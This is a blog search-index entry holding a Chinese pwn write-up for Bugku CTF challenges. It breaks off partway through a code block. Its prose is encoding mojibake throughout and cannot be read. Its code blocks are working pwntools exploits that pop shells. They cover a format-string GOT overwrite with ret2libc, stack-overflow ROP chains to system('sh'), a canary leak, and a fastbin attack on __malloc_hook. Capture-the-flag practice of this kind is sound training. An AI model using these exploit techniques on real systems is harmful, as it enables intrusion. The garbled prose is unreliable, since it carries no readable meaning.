<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bugku_CTFçš„pwné¢˜è§£</title>
    <url>/2024/08/21/bugku-ctf%E7%9A%84pwn%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p>ä¹‹å‰äº†è§£è¿™å¹³å°ï¼Œå¥½åƒè¿˜æ˜¯å¸ˆå‚…ä»¬æ‰“AWDã€‚å°¤å…¶æœ¬äººæ²¡æ‰“è¿‡ï¼Œæ‰€ä»¥ä¸è®¨è®ºæœ‰æœºä¼šå’Œå¸ˆå‚…ä»¬ä¸€èµ·ç©ã€‚é“¾æ¥å¦‚ä¸‹<a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></p>
</blockquote>
<h5 id="ç‘å£«å†›åˆ€"><a href="#ç‘å£«å†›åˆ€" class="headerlink" title="ç‘å£«å†›åˆ€"></a>ç‘å£«å†›åˆ€</h5><p>çœ‹åå­—å°±çŸ¥é“æ˜¯ncï¼Œç›´æ¥è¿ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/dv7yEY8jr1tbXM4.png" alt="5bf7dc71f56cc21887b825b604146ad.png"></p>
<h5 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h5><p>è¿™é¢˜å°±æ˜¯ç®€å•çš„fmt+ret2libcï¼Œæ¯”è¾ƒå‘çš„æ˜¯æ²¡ç»™ä½ libcã€‚ç›´æ¥æ³„éœ²æ ˆä¸Šçš„åœ°å€ï¼Œæ‰¾ä¸åˆ°å¯¹åº”çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥å°±æƒ³ç€æ³„éœ²putsï¼Œä½†æ˜¯ç”¨åˆ°äº†%sæ¥è¿›è¡Œæ³„éœ²ã€‚ä¹‹åå°±æ˜¯ç®€å•çš„ä¿®æ”¹gotè¡¨</p>
<p>æ£€æŸ¥ä¿æŠ¤</p>
<p><img src="https://s2.loli.net/2024/08/21/BrXnAZ4WtfSkqGU.png" alt="1724203925407.png"></p>
<p>å¯ä»¥ä¿®æ”¹gotè¡¨</p>
<p><img src="https://s2.loli.net/2024/08/21/f6cpzkCX3g25JKM.png" alt="1724204041564.png"></p>
<p>æ— é™æ¬¡çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æŸ¥çœ‹ä¸€æ³¢offset&#x3D;6</p>
<p><img src="https://s2.loli.net/2024/08/21/Vc5yCiS89LWeNXU.png" alt="13d87bea363ec76b1894dfff32888c1.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pl <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"%6$s"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2024/08/21/L7shSJUb5rfZcIQ.png" alt="19f03a0c3977dc8c3c7b447d08b6c4f.png"></p>
<p>ä¸ºä»€ä¹ˆç”¨så‘¢ï¼Œå› ä¸º%pæ˜¯æ‰“å°è¯¥æŒ‡é’ˆåœ°å€ï¼Œ%sæ˜¯ç›´æ¥æ‰“å°å­—ç¬¦ä¸²ï¼Œåªè¦ä¸é‡åˆ°å­—ç¬¦ä¸²ç»ˆç»“ç¬¦ä»–å°±ä¸ä¼šåœæ­¢ã€‚ä¾æ¬¡è¿˜ä¼šæ‰“å°å‡ºæ¥,å¯ä»¥çœ‹åˆ°å®ƒæ‰“å°å‡ºæ¥äº†puts_gotè¡¨å’Œè¡¨é‡Œé¢çš„å†…å®¹ï¼Œä»¥åŠä¸‹é¢çš„__libc_start_main,putchar@plt+6</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x10 bytes:
    00000000  <span class="token number">18</span> a0 04 08  <span class="token number">80</span> e0 de f7  a0 cc d9 f7  <span class="token number">36</span> <span class="token number">84</span> 04 08  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚6Â·Â·Â·â”‚
    00000010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2024/08/21/25coKgix3CkEaSH.png" alt="d52084820d10da08e49d5cd37714704.png"></p>
<p>ç„¶åå°±æ˜¯æ­£å¸¸çš„ä¿®æ”¹gotè¡¨</p>
<p><img src="https://s2.loli.net/2024/08/21/nsXqY6t8BDaj2zO.png" alt="00b5e39edc410870d31b9cfffd7e451.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
    ru<span class="token punctuation">(</span><span class="token string">" repeater?\n"</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"%6$s"</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    
    puts <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
    lg<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>

    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>

    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
    offset <span class="token operator">=</span> <span class="token number">6</span>
    pl <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token punctuation">&#123;</span>printf_got<span class="token punctuation">:</span>system<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    s<span class="token punctuation">(</span><span class="token string">"/bin/bash\00"</span><span class="token punctuation">)</span>

    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h5><p>é¡¾åæ€ä¹‰ï¼Œæº¢å‡ºã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/THjZoArRIp6X5Dv.png" alt="1724204617919.png"></p>
<p>æœ‰åé—¨ï¼Œæ ˆæº¢å‡ºã€‚</p>
<p>æ£€æŸ¥ä¿æŠ¤</p>
<p><img src="https://s2.loli.net/2024/08/21/yfHwDvtOz56AWMT.png" alt="1724204681500.png"></p>
<p>æ‰“æ³•å¾ˆå¤šã€‚shellcodeä¹Ÿå¯ä»¥ï¼Œç”¨backdoorä¹Ÿå¯ä»¥</p>
<p><img src="https://s2.loli.net/2024/08/21/OtAzYbRd6xueEXN.png" alt="1724204920275.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    backdoor <span class="token operator">=</span> <span class="token number">0x400751</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="Easy-int"><a href="#Easy-int" class="headerlink" title="Easy_int"></a>Easy_int</h5><p>ä»–çš„è¿™ä¸ªä¿æŠ¤æˆ‘çœ‹ç€éƒ½æ¯”è¾ƒé™Œç”Ÿäº†ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/cNJjXLnb45Eoufs.png" alt="1724205279658.png"></p>
<p>çœ‹çœ‹æºç ï¼Œä¸Šæ¥å°±æ˜¯ä¸€ä¸ªçŸ¥è¯†ç‚¹é¢˜ï¼Œè®©ä½ è¾“å…¥ä¸€ä¸ªæ•°NUMï¼Œä¸”NUMå’Œ-NUMéƒ½è¦æ˜¯è´Ÿæ•°ã€‚è¿™å°±æ˜¯æœºç»„çš„çŸ¥è¯†äº†ï¼Œintè¡¨ç¤ºèŒƒå›´æ˜¯-2147483648~2147483647ï¼Œæˆ‘è¾“å…¥-2147483648çš„æ—¶å€™ï¼Œä»–åœ¨æ•°è½´çš„æ­£åŠè½´æ²¡æœ‰å¯¹åº”çš„æ•°ï¼Œæ‰€ä»¥è¿˜æ˜¯è´Ÿæ•°ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/1rItJnXQ6gN7p3D.png" alt="1724205471521.png"></p>
<p>æŸ¥çœ‹å­—ç¬¦è¡¨æœ‰systemå’Œshã€‚åœ¨æ‰¾ä¸€ä¸ªpop rdiçš„gadgetï¼Œè¿˜æœ‰ä¸€ä¸ªretç”¨äºæ ˆå¯¹é½</p>
<p><img src="https://s2.loli.net/2024/08/21/chukqXD5Ax2a1rO.png" alt="1724205646757.png"></p>
<p><img src="https://s2.loli.net/2024/08/21/5M8Tqw2CBcIb14V.png" alt="1724205698995.png"></p>
<p>æœ€ågetshell</p>
<p><img src="https://s2.loli.net/2024/08/21/uBb5AWHszetFo9Q.png" alt="1724205902355.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    ru<span class="token punctuation">(</span><span class="token string">"Input your int:\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>

    pop_rdi <span class="token operator">=</span> <span class="token number">0x0401343</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    sh <span class="token operator">=</span> <span class="token number">0x403500</span>
    system <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Congratulations!\n"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h5><p>é¡¾åæ€ä¹‰è‚¯å®šæ˜¯ä¸ºäº†å¾—åˆ°canaryã€‚å¯ä»¥åˆ©ç”¨%så°†canaryæ‰“å°å‡ºæ¥ã€‚ä¸ä¸Šä¸€é¢˜ä¸€æ ·éƒ½ç»™äº†systemå’Œsh</p>
<p><img src="https://s2.loli.net/2024/08/21/NX8Jw5kOpynhTHE.png" alt="1724206036201.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ru<span class="token punctuation">(</span><span class="token string">"Please leave your name(Within 36 Length):"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span> <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b"\x00"</span> <span class="token operator">+</span> r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span><span class="token comment">#æ³„éœ²canary</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2024/08/21/pTBjNgJ9d4ViF5U.png" alt="1724207168798.png"></p>
<p>æœ€ågetshell</p>
<p><img src="https://s2.loli.net/2024/08/21/czUTGOvRpXs175S.png" alt="1724207134737.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    ru<span class="token punctuation">(</span><span class="token string">"Please leave your name(Within 36 Length):"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">568</span> <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b"\x00"</span> <span class="token operator">+</span> r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>

    system <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
    sh <span class="token operator">=</span> <span class="token number">0x601068</span>
    ret <span class="token operator">=</span> <span class="token number">0x0400611</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x400963</span>

    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"Please leave a message(Within 0x200 Length):"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="overflow2"><a href="#overflow2" class="headerlink" title="overflow2"></a>overflow2</h5><p>è¿™é¢˜å’Œå‰é¢ä¸¤é¢˜ä¸€æ ·ç»™äº†systemå’Œshã€æ ˆæº¢å‡ºï¼Œç›´æ¥æ‰“ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/LpoWQIHrO6yKZCM.png" alt="1724207631255.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    system <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    sh <span class="token operator">=</span> <span class="token number">0x402004</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x040126b</span>
    ret <span class="token operator">=</span> <span class="token number">0x401016</span>

    ru<span class="token punctuation">(</span><span class="token string">" your name.\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="Baby-heap1"><a href="#Baby-heap1" class="headerlink" title="Baby-heap1"></a>Baby-heap1</h5><p>è¿™é¢˜ç»ˆäºèƒ½è®©æˆ‘æ¶¨ç‚¹é‡‘å¸äº†ã€‚ğŸ˜€æˆ‘ç”¨çš„ç‰ˆæœ¬æ˜¯2.23-0ubuntu11.3_amd64ï¼Œæ‰“é€šäº†ã€‚</p>
<p>æ£€æŸ¥ä¿æŠ¤å…¨å¼€</p>
<p><img src="https://s2.loli.net/2024/08/21/8KRmGhqvZ6J2s9o.png" alt="1724209732373.png"></p>
<p>idaæ‰“å¼€é€æ¸åˆ†æå‘ç°æ¼æ´ç‚¹åº”è¯¥æ˜¯å †æº¢å‡º</p>
<p><img src="https://s2.loli.net/2024/08/21/BoYitIxRUjpP1wf.png" alt="1724209788827.png"></p>
<p>ç›´æ¥å¼€æ‰“ï¼Œå…ˆå¸ƒç½®å¥½å †ï¼Œæˆ‘çš„ç¬¬ä¸€æ€è·¯è¿˜æ˜¯æ‰“__malloc_hookã€‚</p>
<p>ç”³è¯·ä¸€ä¸ªunsortedbinèŒƒå›´çš„chunkï¼Œä¹‹åç»™ä»–deleteæ‰ï¼Œä»–çš„fdå’ŒbkæŒ‡é’ˆä¿ç•™ï¼Œç›´æ¥æ³„éœ²ã€‚ä¹‹åå°±æ˜¯æŠŠä½ éœ€è¦çš„æ•°æ®éƒ½æ‰¾åˆ°ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#0</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#1	</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#2</span>
add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#3ï¼Œé˜²æ­¢ä¸top chunkåˆå¹¶</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#0</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
 __malloc_hook <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x58</span> <span class="token operator">-</span> <span class="token number">0x10</span>
fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>
libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_base<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2024/08/21/OyQujLbUihsloJ6.png" alt="1724210103042.png"></p>
<p>ä¹‹åå°±æ˜¯å› ä¸ºå®ƒå¯ä»¥ä»»æ„é•¿åº¦å †æº¢å‡ºï¼Œç›´æ¥freeæ‰ä¸¤ä¸ªfastbinå†ä¿®æ”¹chunk1çš„fdæŒ‡é’ˆï¼Œä½¿å¾—å…¶æŒ‡å‘fake_chunkåœ°å€</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
   delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

   pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>
   edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2024/08/21/AzO6afL7IoymFbR.png" alt="1724210145710.png"></p>
<p>æœ€åå› ä¸ºæ ˆå¸§é—®é¢˜ï¼Œæ‰€ä»¥éœ€è¦å€ŸåŠ©reallocæ¥è¿›è¡Œè°ƒæ•´ã€‚å¾€reallocé‡Œé¢å†™å…¥onegadgetåœ¨mallocé‡Œé¢å†™å…¥reallocã€‚</p>
<p><img src="https://s2.loli.net/2024/08/21/Umoj5XJ78PxHbsD.png" alt="1724210319177.png"></p>
<p>æœ€ågetshell</p>
<p><img src="https://s2.loli.net/2024/08/21/wXKk6JyB2GTeHqu.png" alt="1724209713808.png"></p>
<h5 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h5><p>æˆ‘ä»¬å…ˆæŠŠæ ˆæ‰“å®Œå†å»çœ‹é‚£ä¸¤ä¸ªå †ã€‚å› ä¸ºæˆ‘å¿«åƒé¥­äº†ã€‚æ€•æ²¡æ—¶é—´æ‰“å®Œã€‚</p>
<p>æ£€æŸ¥ä¿æŠ¤</p>
<p><img src="https://s2.loli.net/2024/08/21/AafzUDKSjuVLeFy.png" alt="1724222808473.png"></p>
<p>å‡½æ•°æœ‰ä¸‰ä¸ªé€‰é¡¹ï¼Œå¯¹åº”ä¸‰ä¸ªencode</p>
<p><img src="https://s2.loli.net/2024/08/21/HSBw9GP8AsFc5ai.png" alt="1724222932229.png"></p>
<p>encode1ï¼Œå¯ä»¥å¾€è¿™ä¸ªæ•°æ®æ®µçš„srcå†™å…¥ä¸€ä¸ª0x150çš„æ•°æ®</p>
<p><img src="https://s2.loli.net/2024/08/21/eTpk5G9LWDAmdyc.png" alt="1724223003229.png"></p>
<p>encode2ï¼Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿™ä¸ªbuf1æ˜¯bssæ®µä¸Šçš„ã€‚æ‰€ä»¥è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯éæ ˆä¸Šçš„</p>
<p><img src="https://s2.loli.net/2024/08/21/wI3WMP4HVBGaU6i.png" alt="1724223063271.png"></p>
<p>encode3ï¼Œè¿™ä¸ªå°±æŠŠbufçš„å€¼å¤åˆ¶åˆ°srcé‡Œé¢</p>
<p><img src="https://s2.loli.net/2024/08/21/ZzOHvAbSq8a7fxY.png" alt="1724223123472.png"></p>
<p>å¯ä»¥æ³¨æ„åˆ°æ¯ä¸ªå‡½æ•°é‡Œé¢éƒ½å¯¹åº”ä¸€ä¸ªåŠ å¯†ç®—æ³•ï¼Œå°±æ˜¯ç®€å•çš„ç§»ä½è¿ç®—</p>
<p><img src="https://s2.loli.net/2024/08/21/hM4zygFEW2wmVUu.png" alt="1724223200800.png"></p>
<p>è¿è¡Œç¨‹åºå¯ä»¥å‘ç°ï¼Œæ­£å¸¸æƒ…å†µä¸€ä¸‹åªè¿›è¡Œä¸€æ¬¡å¾ªç¯å°±é€šè¿‡exit(0)é€€å‡ºäº†ã€‚ç”¨idaæŸ¥çœ‹qword_201700&#x3D;0x201700,å‘ç°å…¶åœ¨encode1çš„srcåé¢offset &#x3D; 0x140ï¼Œå°†å…¶ä¿®æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„å€¼å°±å¯ä»¥è¿›è¡Œå¤šæ¬¡å¾ªç¯ï¼Œçœ‹ä¿æŠ¤+fmtå¤§æ¦‚æ€è·¯ä¹Ÿæ˜¯ä¿®æ”¹gotè¡¨ã€‚ä½†æ˜¯è¿™é¢˜æˆ‘æ„Ÿè§‰å¥½å¥‡æ€ªï¼Œæˆ‘çš„æƒ³æ³•è¿˜æ˜¯ä¿®æ”¹printfçš„gotè¡¨ä½†æ˜¯å¥½åƒå°±ä¿®æ”¹åˆ°ç¬¬7æ¬¡å°±å¤±è´¥äº†ã€‚åé¢ä¸€ç›´æ‰¾åŸå› ä¹Ÿæ²¡æ‰¾åˆ°ã€‚è€Œä¸”è¿™ä¸ªlibcç‰ˆæœ¬æ˜¯ä¸ªå°ç‰ˆæœ¬libc6_2.23-0ubuntu11.2_amd64ã€‚</p>
<blockquote>
<p>è¿™æ˜¯æˆ‘è‡ªå·±çš„æ€è·¯ï¼Œä½†æ˜¯è¡Œä¸é€šåœ¨è¿™é‡Œã€‚æˆ‘ä¹‹å‰çš„æ¯”èµ›è¿™ç§éæ ˆä¸Šçš„éƒ½æ˜¯è¿™ä¹ˆæ‰“çš„ï¼Œæ‚¨å¯ä»¥åšä¸ªå‚è€ƒã€‚</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#encode2çš„é€†ç®—æ³•</span>
<span class="token keyword">def</span> <span class="token function">choice2encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b11111100</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> strarg<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#encode3çš„é€†ç®—æ³•</span>
<span class="token keyword">def</span> <span class="token function">choice3encode</span><span class="token punctuation">(</span>strarg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0b00111111</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token 